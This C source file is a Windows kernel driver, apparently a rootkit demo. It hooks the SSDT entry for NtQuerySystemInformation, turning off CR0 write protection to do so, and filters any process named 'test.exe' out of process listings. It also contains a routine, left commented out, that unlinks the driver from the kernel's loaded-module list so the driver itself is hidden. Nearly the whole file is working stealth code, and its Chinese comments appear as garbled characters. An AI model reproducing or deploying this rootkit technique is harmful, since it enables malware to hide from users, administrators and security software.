/**
 * չʾ����
 * ���ؽ���demo��
 * ͨ��hook SSDT��ʽʵ��
 * ��ZwQuerySystemInformation()����hook��
 *����hook����NtQuerySystemInformation()
 */

#include <ntddk.h>
#include <windef.h>
#include <ntimage.h>

//���ԭ������ַ
PVOID oldNtQuerySystemInformation;
//���ԭ��������
ULONG ulSSDTFunctionIndex = 0;
//SSDT
DWORD *SSDTcallTable;


typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemProcessInformation = 5,//��ʱ��ӦSystemInformation��ŵ��ǽ�����Ϣ
	SystemProcessorPerformanceInformation = 8
}SYSTEM_INFORMATION_CLASS;


typedef NTSTATUS (*NtQuerySystemInformationPtr)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
	);

//ZwQuerySystemInformation()��Ҫ�������ṹ���������
typedef struct _SYSTEM_PROCESS_INFO {
	ULONG NextEntryOffset;   //��һ���ṹ���ƫ��
	ULONG NumberOfThreads;   
	
	ULONG  Reserved[6];
	LARGE_INTEGER CreatedTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;//���̵��ļ���
	KPRIORITY BasePriority;
	HANDLE UniqueProceessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE  Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;


//�ж��Ƿ�����ش˽���  1��ʾ��Ҫ����  0 ��ʾ����Ҫ����
//��������ؽ���
int shouldHide(PSYSTEM_PROCESS_INFO systeminfo) {
	//ͨ�����ƽ����ж�
	if (NULL != wcsstr((*systeminfo).ProcessName.Buffer, L"test.exe"))
		return 1;
	return 0;
}

//�滻����
NTSTATUS newNtQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength) 
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESS_INFO cSPI;//��ǰ������Ϣ
	PSYSTEM_PROCESS_INFO pSPI;//��һ���ṹ��

	ntStatus = ((NtQuerySystemInformationPtr)(oldNtQuerySystemInformation))(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (!NT_SUCCESS(ntStatus)) {
		return(ntStatus);
	}
	if (SystemInformationClass != SystemProcessInformation) {
		return ntStatus;
	}
	cSPI = (PSYSTEM_PROCESS_INFO)SystemInformation;
	pSPI = NULL;
	while (cSPI != NULL) {
		if ((*cSPI).ProcessName.Buffer != NULL) {
			//DbgPrint("ProcName:  %-20ws     pid:  %u\n", (*cSPI).ProcessName.Buffer, (*cSPI).UniqueProceessId);
			//�ж��Ƿ�Ϊ��Ҫ���صĽ�����
			if (shouldHide(cSPI)) {
				DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "hide process %-20ws��pid %u\n", (*cSPI).ProcessName.Buffer, (*cSPI).UniqueProceessId);
				//��ǰ�Ľ��̲��ǵ�һ��  ��һ������ʱpSPI��NULL
				if (pSPI != NULL) {
					//��ǰ���������һ��
					if ((*cSPI).NextEntryOffset == 0) {
						//������ǰһ���ĺ���ָ������  ����
						(*pSPI).NextEntryOffset = 0;
					}
					else {
						//ǰһ���ĺ���ָ��ƫ������
						(*pSPI).NextEntryOffset = (*pSPI).NextEntryOffset + (*cSPI).NextEntryOffset;
					}
				}
				else {//�ǵ�һ������
					if ((*cSPI).NextEntryOffset == 0) {//ֻ��һ������
						SystemInformation = NULL;
					}
					else {//��һ�����̵��������һ������,��SystemInformation����
						(BYTE*)SystemInformation = ((BYTE*)SystemInformation) + (*cSPI).NextEntryOffset;
					}
				}
			}
		}
		//�������������һ�����̽ṹ����Ϣ
		pSPI = cSPI;
		if ((*cSPI).NextEntryOffset != 0) {
			(BYTE*)cSPI = ((BYTE*)cSPI) + (*cSPI).NextEntryOffset;
		}
		else {
			cSPI = NULL;
		}
	}
	return ntStatus;
}


//�����ؼ����ݽṹ�Ķ���
#pragma pack(1)
typedef struct  ServiceDescriptorEntry {
	DWORD *KiServiceTable;//SSDT��ַ
	DWORD* CounterBaseTable;
	DWORD nSystemCalls;
	DWORD* KiArgumentTable;
}SDE,*PSDE;
#pragma pack()

typedef struct ServiceDescriptorTable {
	SDE ServiceDescriptor[4];
}SDT;

//ͨ������cr0�Ĵ�����WPλ���������߹ر�д����
VOID disableWP_cr0() {
	//0xfffeffff  -> 11111111 11111110 11111111 11111111
	__asm {
		PUSH EBX
		MOV EBX,cr0
		AND EBX,0xfffeffff
		MOV CR0,EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "disable write protection\n");
	return;
}

VOID enableWP_cr0() {
	__asm {
		PUSH EBX
		MOV EBX, cr0
		OR EBX,0x00010000
		MOV CR0, EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "enable write protection\n");
	return;
}



// �ڴ�ӳ���dll�ļ�
NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSection, PVOID* ppBaseAddress)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	OBJECT_ATTRIBUTES objectAttributes = { 0 };
	IO_STATUS_BLOCK iosb = { 0 };
	PVOID pBaseAddress = NULL;
	SIZE_T viewSize = 0;
	// �� DLL �ļ�, ����ȡ�ļ����
	InitializeObjectAttributes(&objectAttributes, &ustrDllFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	status = ZwOpenFile(&hFile, GENERIC_READ, &objectAttributes, &iosb,
		FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwOpenFile Error! [error code: 0x%X]", status);
		return status;
	}
	// ����һ���ڶ���, �� PE �ṹ�е� SectionALignment ��С����ӳ���ļ�
	status = ZwCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, 0, PAGE_READWRITE, 0x1000000, hFile);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hFile);
		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwCreateSection Error! [error code: 0x%X]\n", status);
		return status;
	}
	// ӳ�䵽�ڴ�
	status = ZwMapViewOfSection(hSection, NtCurrentProcess(), &pBaseAddress, 0, 1024, 0, &viewSize, ViewShare, MEM_TOP_DOWN, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hSection);
		ZwClose(hFile);
		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwMapViewOfSection Error! [error code: 0x%X]\n", status);
		return status;
	}

	// ��������
	*phFile = hFile;
	*phSection = hSection;
	*ppBaseAddress = pBaseAddress;

	return status;
}

//�ӵ������ȡ����
// ���ݵ������ȡ����������ַ, �Ӷ���ȡ SSDT ����������
ULONG GetIndexFromExportTable(PVOID pBaseAddress, PCHAR pszFunctionName)
{
	ULONG ulFunctionIndex = 0;
	// Dos Header
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
	// NT Header
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)pDosHeader + pDosHeader->e_lfanew);
	// Export Table
	PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	// �����Ƶĵ�����������
	ULONG ulNumberOfNames = pExportTable->NumberOfNames;
	// �����������Ƶ�ַ��
	PULONG lpNameArray = (PULONG)((PUCHAR)pDosHeader + pExportTable->AddressOfNames);
	PCHAR lpName = NULL;
	// ��ʼ����������
	for (ULONG i = 0; i < ulNumberOfNames; i++)
	{
		lpName = (PCHAR)((PUCHAR)pDosHeader + lpNameArray[i]);
		// �ж��Ƿ���Ҫ��ѯ�ĺ���
		if (0 == _strnicmp(pszFunctionName, lpName, strlen(pszFunctionName)))
		{
			// ��ȡ����������ַ
			USHORT uHint = *(USHORT*)((PUCHAR)pDosHeader + pExportTable->AddressOfNameOrdinals + 2 * i);
			ULONG ulFuncAddr = *(PULONG)((PUCHAR)pDosHeader + pExportTable->AddressOfFunctions + 4 * uHint);
			PVOID lpFuncAddr = (PVOID)((PUCHAR)pDosHeader + ulFuncAddr);
			// ��ȡĿ�꺯����Index
			ulFunctionIndex = *(ULONG*)((PUCHAR)lpFuncAddr + 1);
			break;
		}
	}

	return ulFunctionIndex;
}

// �� ntdll.dll �л�ȡ SSDT ����������
ULONG GetSSDTFunctionIndex(UNICODE_STRING ustrDllFileName, PCHAR pszFunctionName)
{
	ULONG ulFunctionIndex = 0;
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID pBaseAddress = NULL;

	// �����ڴ�ӳ��
	status = DllFileMap(ustrDllFileName, &hFile, &hSection, &pBaseAddress);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "DllFileMap Error!\n");
		return ulFunctionIndex;
	}

	// ���ݵ������ȡ SSDT ����������
	ulFunctionIndex = GetIndexFromExportTable(pBaseAddress, pszFunctionName);

	// free
	ZwUnmapViewOfSection(NtCurrentProcess(), pBaseAddress);
	ZwClose(hSection);
	ZwClose(hFile);

	return ulFunctionIndex;
}


//  hook SSDT��Ӧ��
BYTE* hookSSDT(ULONG index,BYTE* newAddr,DWORD *callTable) {
	PLONG target;
	target = (PLONG) & (callTable[index]);
	return ((BYTE*)InterlockedExchange(target, (LONG)newAddr));
}

VOID unhookSSDT(ULONG index,BYTE* oldAddr,DWORD* callTable) {
	PLONG target;
	target = (PLONG) & (callTable[index]);
	InterlockedExchange(target, (LONG)oldAddr);
}

/*************************************
 *   ������������
 *************************************/
//Driver_section�ṹ
typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


void HideDriver(IN PDRIVER_OBJECT DriverObject) {

	KIRQL irql = KeRaiseIrqlToDpcLevel(); 

	PLDR_DATA_TABLE_ENTRY pre_section, next_section, cur_section;
	cur_section = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	pre_section = (PLDR_DATA_TABLE_ENTRY)cur_section->InLoadOrderLinks.Blink;
	next_section = (PLDR_DATA_TABLE_ENTRY)cur_section->InLoadOrderLinks.Flink;

	//˫����ڵ�����
	pre_section->InLoadOrderLinks.Flink = cur_section->InLoadOrderLinks.Flink;
	next_section->InLoadOrderLinks.Blink = cur_section->InLoadOrderLinks.Blink;
	//��ѭ��
	cur_section->InLoadOrderLinks.Flink = (PLIST_ENTRY)cur_section;
	cur_section->InLoadOrderLinks.Blink = (PLIST_ENTRY)cur_section;
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "hide driver .\n");
	KeLowerIrql(irql);
}



VOID Unload(IN PDRIVER_OBJECT DriverObject) {
	//KdBreakPoint();
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoaded.\n");
	disableWP_cr0();
	unhookSSDT(ulSSDTFunctionIndex, oldNtQuerySystemInformation, SSDTcallTable);
	enableWP_cr0();
	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath) {

	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver running.\n");
	(*DriverObject).DriverUnload = Unload;
	//KdBreakPoint();

	//����KeServiceDescriptorTable  ��ȡssdt��ַ
	__declspec(dllimport) SDE KeServiceDescriptorTable;
	SSDTcallTable = KeServiceDescriptorTable.KiServiceTable;

	//��ȡ������Ӧ������
	UNICODE_STRING ustrDllFileName;
	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	//ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQuerySystemInformation");
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "NtQuerySystemInformation");

	//��ȡ������ַ
	oldNtQuerySystemInformation = SSDTcallTable[ulSSDTFunctionIndex];

	if (NULL == oldNtQuerySystemInformation)
	{
		DbgPrint("Get SSDT Function address Error!\n");
		return STATUS_SUCCESS;
	}

	//�޸��ں˶���DriverObject��DRIVER_SECTION
	//�����˫������ժ����������������
	//HideDriver(DriverObject);

	KdBreakPoint();

	disableWP_cr0();
	//oldZwQuerySystemInformation = hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
	hookSSDT(ulSSDTFunctionIndex, newNtQuerySystemInformation, SSDTcallTable);
	enableWP_cr0();
	KdBreakPoint();

	return(STATUS_SUCCESS);
}
